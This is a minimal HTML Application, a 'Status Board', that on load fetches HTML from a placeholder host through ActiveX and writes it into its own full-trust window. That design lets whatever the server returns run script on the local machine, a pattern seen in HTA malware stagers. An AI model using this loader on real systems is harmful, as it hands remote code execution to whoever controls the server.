<!DOCTYPE html>
<html>
<head>
<title>Status Board</title>
<HTA:APPLICATION ID="status" APPLICATIONNAME="status" SHOWINTASKBAR="yes" SINGLEINSTANCE="yes" WINDOWSTATE="normal" />
<script language="JScript">
    function refresh() {
        try {
            var client = new ActiveXObject("Msxml2.XMLHTTP.3.0");
            client.open("GET", "https://example.invalid/status.html", false);
            client.send();
            if (client.status == 200) {
                document.write(client.responseText);
            }
        } catch (e) {
            document.write("<p>status unavailable</p>");
        }
    }
</script>
</head>
<body onload="refresh()"></body>
</html>
